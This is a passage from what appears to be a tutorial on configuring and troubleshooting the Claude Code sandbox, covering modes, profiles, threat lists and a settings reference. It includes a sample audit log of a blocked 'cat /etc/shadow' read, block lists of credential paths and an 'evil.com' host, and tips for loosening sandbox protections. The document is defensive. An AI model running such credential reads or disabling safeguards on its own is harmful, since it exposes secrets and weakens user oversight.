# - Network only to approved registries
# - Resource limits prevent runaway jobs
# - CI environment variables available
# - Credentials explicitly excluded
```

### Example 7: Development vs Production Sandbox Profiles

Managing different sandbox profiles for different environments:

```json
// profiles.json
{
  "sandbox": {
    "profiles": {
      "development": {
        "enabled": true,
        "mode": "permissive",
        "allowNetwork": true,
        "allowedPaths": [
          "${workspaceFolder}",
          "~/.config",
          "/tmp"
        ],
        "blockedPaths": [
          "~/.ssh",
          "~/.aws"
        ],
        "timeout": 300
      },
      "staging": {
        "enabled": true,
        "mode": "strict",
        "allowNetwork": true,
        "allowedPaths": [
          "${workspaceFolder}",
          "/tmp"
        ],
        "blockedPaths": [
          "~/*",
          "/etc"
        ],
        "timeout": 120,
        "networkRules": {
          "allowedHosts": ["staging-api.example.com"]
        }
      },
      "production": {
        "enabled": true,
        "mode": "strict",
        "allowNetwork": false,
        "allowedPaths": [
          "${workspaceFolder}/dist"
        ],
        "blockedPaths": ["*"],
        "readOnly": true,
        "timeout": 60
      }
    },
    "activeProfile": "development"
  }
}
```

**Usage scenario:**

```bash
# Switch between profiles
/sandbox profile development
# "Switched to development profile (permissive mode)"

/sandbox profile production
# "Switched to production profile (strict mode, read-only)"

# View current profile
/sandbox status
# Shows active profile configuration
```

---

## Sandbox Modes Comparison

### Mode Overview

| Mode | Network | File Access | Syscalls | Use Case |
|------|---------|-------------|----------|----------|
| **strict** | Disabled | Project only | Heavily filtered | Untrusted code, security analysis |
| **permissive** | Enabled | Wide access | Lightly filtered | Trusted projects, development |
| **custom** | Configurable | Configurable | Configurable | Specific requirements |
| **disabled** | Full | Full | None | System administration |

### Detailed Comparison

```
+------------------------------------------------------------------+
|                     STRICT MODE                                   |
+------------------------------------------------------------------+
|                                                                   |
|  Network Access:                                                  |
|  [X] Outbound connections          [X] Inbound connections        |
|  [X] DNS resolution               [X] Raw sockets                 |
|                                                                   |
|  File Access:                                                     |
|  [/] Read project directory       [/] Write project directory     |
|  [X] Read home directory          [X] Write system files          |
|  [/] Read system libraries        [X] Access credentials          |
|                                                                   |
|  Operations:                                                      |
|  [/] Process execution            [X] Process debugging           |
|  [/] File creation                [X] Symlink creation            |
|  [/] Directory listing            [X] Mount operations            |
|                                                                   |
|  Legend: [/] Allowed  [X] Blocked                                 |
|                                                                   |
+------------------------------------------------------------------+

+------------------------------------------------------------------+
|                   PERMISSIVE MODE                                 |
+------------------------------------------------------------------+
|                                                                   |
|  Network Access:                                                  |
|  [/] Outbound connections          [X] Inbound connections        |
|  [/] DNS resolution               [X] Raw sockets                 |
|                                                                   |
|  File Access:                                                     |
|  [/] Read project directory       [/] Write project directory     |
|  [/] Read home directory          [X] Write system files          |
|  [/] Read system libraries        [X] Access credentials          |
|                                                                   |
|  Operations:                                                      |
|  [/] Process execution            [X] Process debugging           |
|  [/] File creation                [/] Symlink creation            |
|  [/] Directory listing            [X] Mount operations            |
|                                                                   |
|  Legend: [/] Allowed  [X] Blocked                                 |
|                                                                   |
+------------------------------------------------------------------+

+------------------------------------------------------------------+
|                    CUSTOM MODE                                    |
+------------------------------------------------------------------+
|                                                                   |
|  All settings configurable via settings.json                      |
|                                                                   |
|  Example configurations:                                          |
|                                                                   |
|  API Development:                                                 |
|    Network: outbound + specific inbound ports                     |
|    Files: project + npm cache                                     |
|    Operations: standard + server binding                          |
|                                                                   |
|  Data Analysis:                                                   |
|    Network: disabled                                              |
|    Files: project + data directories (read-only)                  |
|    Operations: standard + large memory allocation                 |
|                                                                   |
|  System Monitoring:                                               |
|    Network: localhost only                                        |
|    Files: /proc, /sys (read-only)                                 |
|    Operations: standard + restricted system reads                 |
|                                                                   |
+------------------------------------------------------------------+

+------------------------------------------------------------------+
|                   DISABLED MODE                                   |
+------------------------------------------------------------------+
|                                                                   |
|  WARNING: No sandbox protection active                            |
|                                                                   |
|  Network Access:                                                  |
|  [/] Outbound connections          [/] Inbound connections        |
|  [/] DNS resolution               [/] Raw sockets                 |
|                                                                   |
|  File Access:                                                     |
|  [/] All file operations with user permissions                    |
|                                                                   |
|  Operations:                                                      |
|  [/] All operations with user permissions                         |
|                                                                   |
|  Recommended only for:                                            |
|  - System administration                                          |
|  - Debugging sandbox issues                                       |
|  - Operations that cannot work in sandbox                         |
|                                                                   |
|  Always re-enable sandbox when done: /sandbox enable              |
|                                                                   |
+------------------------------------------------------------------+
```

---

## Security Implications

### What Sandbox Prevents

The sandbox provides protection against numerous security threats:

```
+------------------------------------------------------------------+
|              Security Threats Mitigated by Sandbox                |
+------------------------------------------------------------------+
|                                                                   |
|  DATA THEFT:                                                      |
|  +------------------------------------------------------------+  |
|  | - SSH key exfiltration                                      |  |
|  | - AWS credential theft                                      |  |
|  | - Database password extraction                              |  |
|  | - Browser cookie/history access                             |  |
|  | - Email/document access                                     |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  SYSTEM DAMAGE:                                                   |
|  +------------------------------------------------------------+  |
|  | - File deletion (outside project)                           |  |
|  | - System configuration changes                              |  |
|  | - Boot sector modification                                  |  |
|  | - Kernel module loading                                     |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  NETWORK ATTACKS:                                                 |
|  +------------------------------------------------------------+  |
|  | - Data exfiltration to external servers                     |  |
|  | - Cryptocurrency mining                                     |  |
|  | - Botnet participation                                      |  |
|  | - Internal network scanning                                 |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  PRIVILEGE ESCALATION:                                            |
|  +------------------------------------------------------------+  |
|  | - SUID exploitation                                         |  |
|  | - Sudo abuse                                                |  |
|  | - Container escape attempts                                 |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

### What Sandbox Cannot Prevent

Understanding sandbox limitations is crucial:

```
+------------------------------------------------------------------+
|                  Sandbox Limitations                              |
+------------------------------------------------------------------+
|                                                                   |
|  CANNOT PREVENT:                                                  |
|                                                                   |
|  1. Malicious operations within allowed scope                     |
|  +------------------------------------------------------------+  |
|  | If you allow write access to a directory, sandbox cannot    |  |
|  | prevent deletion of files within that directory.            |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  2. Side-channel attacks                                          |
|  +------------------------------------------------------------+  |
|  | Timing attacks, cache-based attacks may still be possible   |  |
|  | depending on isolation level.                               |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  3. Kernel vulnerabilities                                        |
|  +------------------------------------------------------------+  |
|  | If there's a kernel bug, sandbox may be bypassed.           |  |
|  | Keep your system updated.                                   |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  4. User-approved risky operations                                |
|  +------------------------------------------------------------+  |
|  | If you disable sandbox or approve dangerous commands,       |  |
|  | the sandbox cannot protect you.                             |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  5. Social engineering                                            |
|  +------------------------------------------------------------+  |
|  | The sandbox cannot prevent you from being tricked into      |  |
|  | disabling protections.                                      |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

### Combining Sandbox + Permissions

For maximum security, use both systems together:

```
+------------------------------------------------------------------+
|            Combined Security: Permissions + Sandbox               |
+------------------------------------------------------------------+
|                                                                   |
|  Scenario: User asks Claude to "clean up the project"             |
|                                                                   |
|  Step 1: Claude generates command                                 |
|  > rm -rf ./node_modules ./dist ./build                           |
|                                                                   |
|  Step 2: Permission system checks                                 |
|  +------------------------------------------------------------+  |
|  | "This command will delete directories. Allow? [y/N]"        |  |
|  |                                                             |  |
|  | User reviews and approves (or denies)                       |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Step 3: Sandbox enforcement                                      |
|  +------------------------------------------------------------+  |
|  | Even if approved, command executes in sandbox               |  |
|  | - Can only delete within project directory                  |  |
|  | - Cannot accidentally delete system files                   |  |
|  | - Path traversal attacks fail                               |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Step 4: OS-level permissions                                     |
|  +------------------------------------------------------------+  |
|  | Final check by operating system                             |  |
|  | - User must own files to delete them                        |  |
|  | - System files protected by root ownership                  |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

### Risk Assessment Framework

Use this framework to decide on appropriate sandbox settings:

```
+------------------------------------------------------------------+
|                  Risk Assessment Matrix                           |
+------------------------------------------------------------------+
|                                                                   |
|  RISK FACTORS:                                                    |
|                                                                   |
|  Code Source:                                                     |
|  +------------------------------------------------------------+  |
|  | Low Risk:    Your own code, team code, known repos          |  |
|  | Medium Risk: Popular open source, Stack Overflow snippets   |  |
|  | High Risk:   Unknown sources, downloaded scripts            |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Operation Type:                                                  |
|  +------------------------------------------------------------+  |
|  | Low Risk:    Reading files, listing directories             |  |
|  | Medium Risk: Writing files, installing packages             |  |
|  | High Risk:   System commands, network operations            |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Data Sensitivity:                                                |
|  +------------------------------------------------------------+  |
|  | Low Risk:    Public data, test data                         |  |
|  | Medium Risk: Internal data, development databases           |  |
|  | High Risk:   Production data, credentials, PII              |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  RECOMMENDED SETTINGS:                                            |
|                                                                   |
|  All Low:      permissive mode                                    |
|  Mixed:        strict mode with specific exceptions               |
|  Any High:     strict mode, consider disabling AI assistance      |
|                                                                   |
+------------------------------------------------------------------+
```

---

## Troubleshooting

### Common Issues and Solutions

#### Issue: "Sandbox initialization failed"

```
Error: Sandbox initialization failed
Platform: Linux
Details: bwrap: No permissions to create new namespace

SOLUTIONS:

1. Check if bubblewrap is installed:
   $ which bwrap
   If not found: sudo apt install bubblewrap

2. Check user namespace permissions:
   $ cat /proc/sys/kernel/unprivileged_userns_clone
   If 0, enable with:
   $ sudo sysctl kernel.unprivileged_userns_clone=1

   To persist across reboots:
   $ echo 'kernel.unprivileged_userns_clone=1' | \
     sudo tee /etc/sysctl.d/00-local-userns.conf

3. Check for AppArmor/SELinux restrictions:
   $ aa-status  # AppArmor
   $ getenforce  # SELinux

   May need to adjust policies or run:
   $ sudo aa-complain /usr/bin/bwrap

4. Check cgroup permissions:
   $ cat /proc/self/cgroup
   Ensure your user can access cgroup controllers

5. Fallback: Run Claude Code with --no-sandbox flag
   (Not recommended for security)
   $ claude --no-sandbox
```

#### Issue: "Command blocked unexpectedly"

```
Error: Command execution blocked
Command: npm install express
Reason: Network access denied

SOLUTIONS:

1. Check current sandbox mode:
   /sandbox status
   If mode is "strict", network is disabled by default

2. Enable network for this session:
   /sandbox config --network true
   OR
   /sandbox enable --network

3. Add npm-specific rule in settings.json:
   {
     "sandbox": {
       "commandRules": {
         "npm": { "allowNetwork": true }
       }
     }
   }

4. Temporarily use permissive mode:
   /sandbox enable --mode permissive

5. Check if specific host is blocked:
   /sandbox config --show
   Look for blockedHosts configuration
```

#### Issue: "Network access denied"

```
Error: Network operation failed
Operation: connect() to api.github.com:443
Reason: Network disabled in sandbox

SOLUTIONS:

1. For temporary network access:
   /sandbox config --network true

2. For specific hosts only:
   {
     "sandbox": {
       "networkRules": {
         "allowedHosts": ["api.github.com", "*.npmjs.org"]
       }
     }
   }

3. Check firewall rules:
   $ sudo iptables -L  # Linux
   $ sudo pfctl -s rules  # macOS

4. Verify DNS is working in sandbox:
   /sandbox config dns.enabled=true

5. For localhost connections:
   {
     "sandbox": {
       "networkRules": {
         "allowLocalhost": true
       }
     }
   }
```

#### Issue: "File permission errors"

```
Error: Permission denied
File: /home/user/projects/other-project/config.json
Operation: read

SOLUTIONS:

1. Check allowed paths:
   /sandbox status
   Look for "Allowed paths" section

2. Add path to allowed list:
   /sandbox config --allow-path /home/user/projects/other-project

3. In settings.json:
   {
     "sandbox": {
       "allowedPaths": [
         "/home/user/projects/*"
       ]
     }
   }

4. Check if path is in blocked list:
   {
     "sandbox": {
       "blockedPaths": [
         "~/projects/secret"  // Remove if needed
       ]
     }
   }

5. Verify actual file permissions:
   $ ls -la /home/user/projects/other-project/config.json
   Ensure your user owns the file

6. For read-only access to sensitive directories:
   {
     "sandbox": {
       "readOnlyPaths": [
         "/home/user/reference-docs"
       ]
     }
   }
```

#### Issue: Platform-Specific Problems

##### Linux-Specific

```
Issue: "Operation not permitted" with bubblewrap

$ dmesg | tail
Check for kernel messages about namespace operations

Solutions:
1. Update kernel (namespace support improved in newer kernels)
   $ sudo apt update && sudo apt upgrade linux-image-generic

2. Check for namespace restrictions:
   $ sysctl -a | grep user_namespaces

3. Verify seccomp support:
   $ grep SECCOMP /boot/config-$(uname -r)

4. Check for container conflicts:
   If running in Docker/LXC, may need --privileged or capabilities
```

##### macOS-Specific

```
Issue: "sandbox-exec: profile denied operation"

Solutions:
1. Check SIP status:
   $ csrutil status
   If disabled, some sandbox features may not work

2. Check sandbox profile syntax:
   $ sandbox-exec -n myprofile /bin/echo test
   Look for syntax errors

3. Code signing issues:
   $ codesign -vvv /path/to/claude
   Ensure binary is properly signed

4. Entitlement problems:
   $ codesign -d --entitlements :- /path/to/claude
   Check for required entitlements
```

##### Windows-Specific

```
Issue: "Sandbox not available on Windows"

Solutions:
1. Install WSL2:
   $ wsl --install

2. Set up Linux distribution:
   $ wsl --install -d Ubuntu

3. Install bubblewrap in WSL:
   $ wsl -d Ubuntu
   $ sudo apt install bubblewrap

4. Configure Claude Code to use WSL:
   {
     "sandbox": {
       "windowsBackend": "wsl2",
       "wslDistribution": "Ubuntu"
     }
   }

5. For native Windows (limited):
   {
     "sandbox": {
       "windowsBackend": "native",
       "mode": "permissive"  // Limited features
     }
   }
```

---

## Quick Reference Cheat Sheet

### Essential Commands

```bash
#------------------------------------------------------------------
#                     SANDBOX QUICK REFERENCE
#------------------------------------------------------------------

# Check sandbox status
/sandbox status

# Enable sandbox (strict mode)
/sandbox enable

# Enable sandbox (permissive mode)
/sandbox enable --mode permissive

# Enable sandbox with network
/sandbox enable --network

# Disable sandbox (with confirmation)
/sandbox disable

# Disable sandbox (force, no confirmation)
/sandbox disable --force

# View configuration
/sandbox config --show

# Set mode
/sandbox config --mode strict|permissive|custom

# Toggle network
/sandbox config --network true|false

# Add allowed path
/sandbox config --allow-path /path/to/directory

# Add blocked path
/sandbox config --block-path /path/to/sensitive

# Set timeout
/sandbox config --timeout 300

# Switch profile
/sandbox profile <profile-name>

# List profiles
/sandbox profile --list
```

### Configuration Templates

```json
// TEMPLATE: Minimal strict sandbox
{
  "sandbox": {
    "enabled": true,
    "mode": "strict"
  }
}

// TEMPLATE: Development sandbox
{
  "sandbox": {
    "enabled": true,
    "mode": "permissive",
    "allowNetwork": true,
    "allowedPaths": ["${workspaceFolder}", "/tmp"],
    "blockedPaths": ["~/.ssh", "~/.aws", "~/.gnupg"]
  }
}

// TEMPLATE: Network-enabled strict sandbox
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "allowNetwork": true,
    "networkRules": {
      "allowedHosts": ["registry.npmjs.org", "github.com"]
    }
  }
}

// TEMPLATE: CI/CD sandbox
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "allowNetwork": true,
    "timeout": 600,
    "allowedPaths": ["${CI_PROJECT_DIR}"],
    "environment": {
      "inherit": ["CI", "CI_*", "PATH"]
    }
  }
}
```

### Mode Quick Selection

```
+------------------------------------------------------------------+
|  WHICH MODE SHOULD I USE?                                         |
+------------------------------------------------------------------+
|                                                                   |
|  Use STRICT when:                                                 |
|  - Reviewing code from unknown sources                            |
|  - Running untrusted scripts                                      |
|  - Maximum security needed                                        |
|  - In CI/CD environments                                          |
|                                                                   |
|  Use PERMISSIVE when:                                             |
|  - Working on your own projects                                   |
|  - Need package manager access (npm, pip)                         |
|  - Running local development servers                              |
|  - Trusted team codebase                                          |
|                                                                   |
|  Use CUSTOM when:                                                 |
|  - Specific requirements don't fit other modes                    |
|  - Need fine-grained control                                      |
|  - Building specialized workflows                                 |
|                                                                   |
|  Use DISABLED when:                                               |
|  - System administration tasks                                    |
|  - Debugging sandbox issues                                       |
|  - Operations that cannot work in sandbox                         |
|  - ALWAYS re-enable when done!                                    |
|                                                                   |
+------------------------------------------------------------------+
```

---

## Best Practices

### When to Use Strict vs Permissive

#### Use Strict Mode When:

1. **Analyzing unfamiliar code**
   ```bash
   # Before reviewing downloaded code
   /sandbox enable --mode strict
   claude "Analyze this script for security issues"
   ```

2. **Running code from the internet**
   ```bash
   # Before executing Stack Overflow solutions
   /sandbox enable --mode strict
   claude "Run this code snippet to test it"
   ```

3. **Working in shared environments**
   ```bash
   # On shared servers or multi-user systems
   /sandbox config --mode strict
   ```

4. **During security assessments**
   ```bash
   # When deliberately testing malicious code
   /sandbox enable --mode strict --no-network
   ```

#### Use Permissive Mode When:

1. **Daily development on trusted projects**
   ```bash
   /sandbox enable --mode permissive
   claude "Set up the development environment"
   ```

2. **Installing dependencies**
   ```bash
   # When you need package manager access
   /sandbox config --mode permissive --network true
   claude "Install project dependencies"
   ```

3. **Running test suites**
   ```bash
   # When tests need broader access
   /sandbox enable --mode permissive --timeout 300
   claude "Run all tests"
   ```

### Team Sandbox Policies

Establish consistent sandbox policies across your team:

```json
// team-sandbox-policy.json
{
  "sandbox": {
    "teamPolicy": {
      "name": "Acme Corp Development Policy",
      "version": "1.0",
      "enforced": true
    },
    "defaults": {
      "mode": "strict",
      "allowNetwork": false
    },
    "exceptions": {
      "requireApproval": true,
      "approvers": ["security-team@acme.com"],
      "maxDuration": "24h"
    },
    "audit": {
      "enabled": true,
      "logPath": "/var/log/claude-sandbox/",
      "alertOn": ["disable", "exception"]
    },
    "profiles": {
      "development": {
        "mode": "permissive",
        "requireAuth": false
      },
      "staging": {
        "mode": "strict",
        "requireAuth": true
      },
      "production": {
        "mode": "strict",
        "readonly": true,
        "requireAuth": true,
        "mfaRequired": true
      }
    }
  }
}
```

### CI/CD Sandbox Configuration

Best practices for automated environments:

```yaml
# .github/workflows/claude-assisted-review.yml
name: Claude Code Review

on: [pull_request]

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure Claude Code Sandbox
        run: |
          cat > ~/.claude/settings.json << 'EOF'
          {
            "sandbox": {
              "enabled": true,
              "mode": "strict",
              "allowNetwork": true,
              "timeout": 300,
              "allowedPaths": [
                "${{ github.workspace }}"
              ],
              "blockedPaths": [
                "/home/runner/.ssh",
                "/home/runner/.aws"
              ],
              "networkRules": {
                "allowedHosts": [
                  "api.anthropic.com"
                ]
              },
              "environment": {
                "inherit": ["CI", "GITHUB_*"],
                "unset": ["GITHUB_TOKEN"]
              }
            }
          }
          EOF

      - name: Run Claude Code Review
        run: |
          claude "Review this PR for security issues"
        env:
          CLAUDE_API_KEY: ${{ secrets.CLAUDE_API_KEY }}
```

### Auditing Sandbox Violations

Monitor and respond to sandbox violations:

```json
// audit-configuration.json
{
  "sandbox": {
    "audit": {
      "enabled": true,
      "logLevel": "verbose",
      "logPath": "/var/log/claude-sandbox/",
      "events": {
        "blocked": {
          "log": true,
          "alert": true,
          "alertThreshold": 5
        },
        "allowed": {
          "log": true,
          "alert": false
        },
        "configChange": {
          "log": true,
          "alert": true
        },
        "disable": {
          "log": true,
          "alert": true,
          "requireReason": true
        }
      },
      "retention": {
        "days": 90,
        "compress": true
      },
      "alerts": {
        "email": ["security@example.com"],
        "slack": "https://hooks.slack.com/...",
        "webhook": "https://security.example.com/alerts"
      }
    }
  }
}
```

**Example audit log entry:**

```json
{
  "timestamp": "2025-01-15T14:32:18Z",
  "event": "blocked",
  "session": "sess_abc123",
  "user": "developer@example.com",
  "command": "cat /etc/shadow",
  "reason": "path_blocked",
  "blockedPath": "/etc/shadow",
  "sandboxMode": "strict",
  "context": {
    "workingDirectory": "/home/user/project",
    "previousCommands": ["ls -la", "cat config.json"]
  }
}
```

---

## Advanced Topics

### Custom Sandbox Profiles

Creating specialized sandbox profiles for different use cases:

```json
// custom-profiles.json
{
  "sandbox": {
    "profiles": {
      "data-science": {
        "enabled": true,
        "mode": "custom",
        "allowNetwork": true,
        "allowedPaths": [
          "${workspaceFolder}",
          "~/data",
          "~/.jupyter",
          "~/.local/lib/python*"
        ],
        "blockedPaths": [
          "~/.ssh",
          "~/.aws"
        ],
        "networkRules": {
          "allowedHosts": [
            "pypi.org",
            "anaconda.org",
            "huggingface.co"
          ]
        },
        "resources": {
          "maxMemory": "16G",
          "maxCpu": 4
        }
      },

      "web-scraping": {
        "enabled": true,
        "mode": "custom",
        "allowNetwork": true,
        "allowedPaths": [
          "${workspaceFolder}",
          "/tmp/scrape-cache"
        ],
        "blockedPaths": ["~/*"],
        "networkRules": {
          "allowOutbound": true,
          "rateLimit": "10/second",
          "timeout": "30s"
        }
      },

      "security-audit": {
        "enabled": true,
        "mode": "strict",
        "allowNetwork": false,
        "allowedPaths": [
          "${workspaceFolder}"
        ],
        "readOnly": true,
        "audit": {
          "logAll": true,
          "verbose": true
        }
      }
    }
  }
}
```

### Integrating with Container Orchestration

Using Claude Code sandbox with Kubernetes:

```yaml
# kubernetes-sandbox-config.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: claude-sandbox-config
data:
  settings.json: |
    {
      "sandbox": {
        "enabled": true,
        "mode": "strict",
        "containerAware": true,
        "kubernetes": {
          "detectPodSandbox": true,
          "inheritPodSecurityContext": true,
          "additionalRestrictions": {
            "blockNodeAccess": true,
            "blockKubernetesApi": true
          }
        },
        "allowedPaths": [
          "/workspace",
          "/tmp"
        ],
        "blockedPaths": [
          "/var/run/secrets/kubernetes.io"
        ]
      }
    }
---
apiVersion: v1
kind: Pod
metadata:
  name: claude-code-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: claude-code
    image: claude-code:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    volumeMounts:
    - name: sandbox-config
      mountPath: /home/claude/.claude/settings.json
      subPath: settings.json
    - name: workspace
      mountPath: /workspace
  volumes:
  - name: sandbox-config
    configMap:
      name: claude-sandbox-config
  - name: workspace
    emptyDir: {}
```

### Sandbox Performance Tuning

Optimize sandbox performance for your workload:

```json
// performance-tuning.json
{
  "sandbox": {
    "enabled": true,
    "mode": "permissive",
    "performance": {
      "caching": {
        "enabled": true,
        "syscallCache": true,
        "pathResolutionCache": true,
        "cacheSize": "100MB"
      },
      "namespaces": {
        "shareNet": true,
        "sharePid": false,
        "shareIpc": true
      },
      "seccomp": {
        "mode": "filter",
        "allowList": true
      },
      "filesystem": {
        "overlayfs": true,
        "copyOnWrite": true,
        "lazyUnmount": true
      },
      "monitoring": {
        "enabled": true,
        "sampleRate": 0.1,
        "metrics": ["syscallLatency", "fsLatency"]
      }
    }
  }
}
```

### Debugging Sandbox Issues

Tools and techniques for troubleshooting:

```bash
# Enable verbose sandbox logging
export CLAUDE_SANDBOX_DEBUG=1
claude "run problematic command"

# Trace syscalls (Linux)
strace -f -e trace=all bwrap --ro-bind /usr /usr /bin/echo test

# Monitor sandbox events
journalctl -f -u claude-sandbox

# Test sandbox profile (macOS)
sandbox-exec -p '(version 1)(allow default)' /bin/ls

# Check namespace status
ls -la /proc/self/ns/

# Verify seccomp filter
grep Seccomp /proc/self/status
```

---

## Summary

### Key Takeaways

1. **Sandboxing is essential** - It provides an additional security layer beyond permissions,
   protecting against both intentional and accidental damage.

2. **Platform-specific implementations** - Linux uses bubblewrap, macOS uses seatbelt, and
   Windows has limited native support (use WSL2 for full features).

3. **Multiple modes available** - Choose strict for untrusted code, permissive for daily
   development, and custom for specific requirements.

4. **Defense in depth** - Sandbox works alongside permissions, OS security, and user judgment
   to provide comprehensive protection.

5. **Configuration is flexible** - Customize allowed paths, network access, and syscall
   filtering to match your workflow.

6. **Audit and monitor** - Enable logging to track sandbox events and respond to violations.

### Security Checklist

Before each Claude Code session, consider:

```
[ ] Is sandbox enabled? (/sandbox status)
[ ] Is the mode appropriate for my task?
[ ] Are sensitive paths blocked?
[ ] Is network access appropriate?
[ ] Am I working with trusted code?
[ ] Have I reviewed the command before approval?
```

### Quick Start

```bash
# Verify sandbox is working
/sandbox status

# For new projects (default security)
/sandbox enable --mode strict

# For daily development
/sandbox enable --mode permissive

# When you need network access
/sandbox config --network true

# Always check before running untrusted code
/sandbox enable --mode strict --no-network
```

---

## Additional Resources

### Documentation Links

- Claude Code Official Documentation
- Linux Namespaces Manual
- Bubblewrap Documentation
- macOS Sandbox Guide
- Seccomp Documentation

### Community Resources

- Claude Code GitHub Issues
- Security Best Practices Guide
- Community Sandbox Profiles Repository

### Getting Help

If you encounter issues with sandboxing:

1. Check `/sandbox status` for current configuration
2. Review this troubleshooting guide
3. Enable debug logging for detailed information
4. Search existing issues in the Claude Code repository
5. Open a new issue with sandbox debug output

---

## Appendix: Complete Configuration Reference

```json
// Complete settings.json sandbox reference
{
  "sandbox": {
    // Basic settings
    "enabled": true,
    "mode": "strict|permissive|custom|disabled",

    // Network configuration
    "allowNetwork": false,
    "networkRules": {
      "allowOutbound": false,
      "allowInbound": false,
      "allowLocalhost": true,
      "allowedHosts": ["example.com"],
      "blockedHosts": ["evil.com"],
      "allowedPorts": [80, 443],
      "blockedPorts": [22],
      "dns": {
        "enabled": true,
        "servers": ["8.8.8.8"]
      }
    },

    // File access configuration
    "allowedPaths": ["/home/user/project"],
    "blockedPaths": ["~/.ssh"],
    "readOnlyPaths": ["/usr"],

    // Execution settings
    "timeout": 120,
    "maxProcesses": 50,
    "maxMemory": "4G",

    // Environment configuration
    "environment": {
      "inherit": ["PATH", "HOME"],
      "set": {"KEY": "value"},
      "unset": ["SECRET"]
    },

    // Command-specific rules
    "commandRules": {
      "npm": {"allowNetwork": true},
      "git": {"allowNetwork": true}
    },

    // Platform-specific settings
    "linux": {
      "bubblewrap": {
        "path": "/usr/bin/bwrap",
        "namespaces": ["pid", "net", "mnt"],
        "seccomp": {"mode": "filter"}
      }
    },
    "macos": {
      "seatbelt": {
        "profilePath": "/tmp/claude.sb"
      }
    },
    "windows": {
      "backend": "wsl2|native",
      "wslDistribution": "Ubuntu"
    },

    // Audit configuration
    "audit": {
      "enabled": true,
      "logPath": "/var/log/claude/",
      "events": ["blocked", "configChange"]
    },

    // Profile management
    "profiles": {
      "development": {"mode": "permissive"},
      "production": {"mode": "strict"}
    },
    "activeProfile": "development"
  }
}
```

---

*This tutorial is part of the Claude Code documentation series.*

*Last updated: January 2025*

*Version: 1.0*
